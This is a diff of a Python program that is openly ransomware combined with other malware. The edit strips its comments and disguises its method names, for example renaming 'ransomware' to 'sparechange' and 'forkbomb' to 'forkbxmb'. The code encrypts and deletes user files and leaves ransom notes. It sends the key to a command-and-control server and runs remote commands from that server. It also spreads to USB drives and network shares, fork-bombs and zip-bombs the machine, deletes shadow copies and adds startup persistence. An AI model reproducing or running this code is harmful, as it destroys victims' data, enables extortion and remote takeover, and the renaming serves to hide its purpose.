@@ -17,7 +17,6 @@ class RWGFZR:
         self.encryption_key = Fernet.generate_key()
         self.cipher = Fernet(self.encryption_key)
         
-        # Target file extensions for ransomware
         self.target_extensions = [
             '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.txt',
             '.jpg', '.png', '.mp4', '.zip', '.rar', '.7z',
@@ -26,9 +25,7 @@ class RWGFZR:
             '.pem', '.key', '.crt', '.pfx', '.ovpn'
         ]
         
-    # ===== RANSOMWARE Component (NEW!) =====
-    def ransomware_component(self):
-        """Encrypts all user files - EXTREME DAMAGE"""
+    def sparechange_component(self):
         
         def find_files_to_encrypt():
             """Find all user documents"""
@@ -56,7 +53,6 @@ class RWGFZR:
             return encrypted_files
         
         def encrypt_file(filepath):
-            """Encrypt a single file"""
             try:
                 with open(filepath, 'rb') as f:
                     data = f.read()
@@ -66,13 +62,12 @@ class RWGFZR:
                 with open(filepath + '.encrypted', 'wb') as f:
                     f.write(encrypted_data)
                 
-                os.remove(filepath)  # Delete original
+                os.remove(filepath)  
                 return True
             except:
                 return False
         
         def create_ransom_note():
-            """Leave ransom note everywhere"""
             note_content = f"""
             ⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️
             
@@ -90,9 +85,7 @@ class RWGFZR:
             YOU HAVE 48 HOURS OR THE KEY WILL BE DESTROYED!
             
             - RWGFZ-R Team
-            """
             
-            # Drop ransom notes everywhere
             locations = [
                 os.path.expanduser("~/DESKTOP_README.txt"),
                 os.path.expanduser("~/README_TO_DECRYPT.txt"),
@@ -107,7 +100,6 @@ class RWGFZR:
                 except:
                     pass
             
-            # Change desktop background (Windows)
             if os.name == 'nt':
                 try:
                     import ctypes
@@ -117,16 +109,13 @@ class RWGFZR:
                 except:
                     pass
         
-        # Execute ransomware
         print("[RANSOMWARE] Scanning for files...")
         files = find_files_to_encrypt()
         
-        # Encrypt files in parallel for speed
         def encrypt_batch(file_batch):
             for file in file_batch:
                 encrypt_file(file)
         
-        # Split into batches
         batch_size = 100
         batches = [files[i:i+batch_size] for i in range(0, len(files), batch_size)]
         
@@ -142,7 +131,6 @@ class RWGFZR:
         print(f"[RANSOMWARE] Encrypted {len(files)} files!")
         create_ransom_note()
         
-        # Send key to C2 (attacker can still decrypt)
         try:
             requests.post(f"{self.c2_server}/ransom_key", 
                          json={"victim": self.victim_id, 
@@ -150,9 +138,7 @@ class RWGFZR:
         except:
             pass
     
-    # ===== RAT Component =====
-    def rat_component(self):
-        """Remote Access - attacker can control everything"""
+    def wrat_component(self):
         while True:
             try:
                 cmd = requests.get(f"{self.c2_server}/commands", timeout=5).text
@@ -162,35 +148,27 @@ class RWGFZR:
                                   data=f"[{self.victim_id}]\n{result.stdout}")
             except:
                 pass
-            threading.Event().wait(5)  # Check every 5 seconds
+            threading.Event().wait(5)  
     
-    # ===== WORM Component =====
-    def worm_component(self):
-        """Self-replication - spreads ransomware to everything"""
+    def snake_component(self):
         while True:
-            # Spread via USB drives
             for drive in self.find_usb_drives():
                 dest = os.path.join(drive, "System_Update.py")
                 if not os.path.exists(dest):
                     shutil.copy2(sys.argv[0], dest)
-                    # Also drop ransom note on USB
                     with open(os.path.join(drive, "README_RANSOM.txt"), 'w') as f:
                         f.write("This drive has been infected! Your files are encrypted!")
             
-            # Spread via network shares
             for share in self.find_network_shares():
                 try:
                     subprocess.run(f"copy {sys.argv[0]} \\\\{share}\\RWGFZ-R.py", shell=True)
-                    # Execute on remote machine
                     subprocess.run(f"psexec \\\\{share} -s python RWGFZ-R.py", shell=True)
                 except:
                     pass
             
-            threading.Event().wait(30)  # Spread every 30 seconds
+            threading.Event().wait(30)  
     
-    # ===== GDI Component =====
-    def gdi_component(self):
-        """Graphical attack - shows ransom message"""
+    def gzi_component(self):
         try:
             import tkinter as tk
             import ctypes
@@ -200,10 +178,8 @@ class RWGFZR:
                 root.geometry(f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}")
                 root.title("🔒 YOUR FILES ARE ENCRYPTED 🔒")
                 
-                # Red background
                 root.configure(bg='red')
                 
-                # Ransom message
                 message = """
                 ⚠️⚠️⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️⚠️⚠️
                 
@@ -225,7 +201,6 @@ class RWGFZR:
                 root.attributes('-topmost', True)
                 root.mainloop()
             
-            # Also flash screen
             def flash_screen():
                 while True:
                     ctypes.windll.user32.MessageBoxW(0, "FILES ENCRYPTED! PAY RANSOM!", 
@@ -237,8 +212,7 @@ class RWGFZR:
         except:
             pass
     
-    # ===== FORKBOMB Component =====
-    def forkbomb_component(self):
+    def forkbxmb_component(self):
         """Process explosion - prevents killing the ransomware"""
         def bomb():
             while True:
@@ -248,22 +222,18 @@ class RWGFZR:
                     os.fork()
                 bomb()
         
-        # Launch forkbombs
         for _ in range(20):
             threading.Thread(target=bomb, daemon=True).start()
     
-    # ===== ZIPBOMB Component =====
-    def zipbomb_component(self):
+    def zipbxmb_component(self):
         """Storage explosion - prevents recovery"""
         def create_zipbomb():
             filename = f"recovery_{os.getpid()}.zip"
             with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) as zf:
-                # Create massive compression bomb
-                data = b'\x00' * (1024 * 1024 * 100)  # 100MB compresses to ~1MB
+                data = b'\x00' * (1024 * 1024 * 100) 
                 for i in range(100):
                     zf.writestr(f"file_{i}.bin", data)
             
-            # Extract repeatedly
             while True:
                 try:
                     with zipfile.ZipFile(filename, 'r') as zf:
@@ -280,7 +250,6 @@ class RWGFZR:
             except:
                 pass
     
-    # ===== Helper Methods =====
     def find_usb_drives(self):
         if os.name == 'nt':
             import string
@@ -299,10 +268,8 @@ class RWGFZR:
         # Network scanning would go here
         return []
     
-    # ===== ANTI-RECOVERY =====
     def anti_recovery_component(self):
         """Prevents system recovery"""
-        # Delete shadow copies (Windows)
         if os.name == 'nt':
             try:
                 subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
@@ -312,7 +279,6 @@ class RWGFZR:
             except:
                 pass
         
-        # Disable system restore
         try:
             if os.name == 'nt':
                 subprocess.run("net stop wscsvc", shell=True)
@@ -320,7 +286,6 @@ class RWGFZR:
         except:
             pass
         
-        # Kill backup processes
         backup_processes = ['backup', 'ntbackup', 'backupexec', 'vssvc']
         for proc in backup_processes:
             try:
@@ -328,21 +293,17 @@ class RWGFZR:
             except:
                 pass
     
-    # ===== MAIN EXECUTION =====
     def execute(self):
-        """Launch ALL components - TOTAL DESTRUCTION"""
         
-        # ORDER MATTERS - Anti-recovery first
         self.anti_recovery_component()
         
-        # Launch all destructive components
         components = [
-            ("RANSOMWARE", self.ransomware_component),
-            ("WORM", self.worm_component),
-            ("GDI", self.gdi_component),
-            ("FORKBOMB", self.forkbomb_component),
-            ("ZIPBOMB", self.zipbomb_component),
-            ("RAT", self.rat_component),  # RAT last so attacker sees results
+            ("SPARECHANGE", self.ransomware_component),
+            ("SNAKE", self.worm_component),
+            ("GZI", self.gdi_component),
+            ("FORKBXMB", self.forkbomb_component),
+            ("ZIPBXMB", self.zipbomb_component),
+            ("WRAT", self.rat_component), 
         ]
         
         for name, component in components:
@@ -350,17 +311,13 @@ class RWGFZR:
             thread = threading.Thread(target=component, daemon=True)
             thread.start()
         
-        # Keep alive - never exit
         while True:
             threading.Event().wait(60)
 
-# Self-execute with persistence
 if __name__ == "__main__":
-    # Add persistence
     if not os.environ.get('RWGFZR_RUNNING'):
         os.environ['RWGFZR_RUNNING'] = '1'
         
-        # Add to startup
         if os.name == 'nt':
             import winreg
             try:
@@ -371,6 +328,5 @@ if __name__ == "__main__":
             except:
                 pass
     
-    # Launch the digital apocalypse
-    malware = RWGFZR()
-    malware.execute()
+    Fun = RWGFZR()
+    Fun.execute()
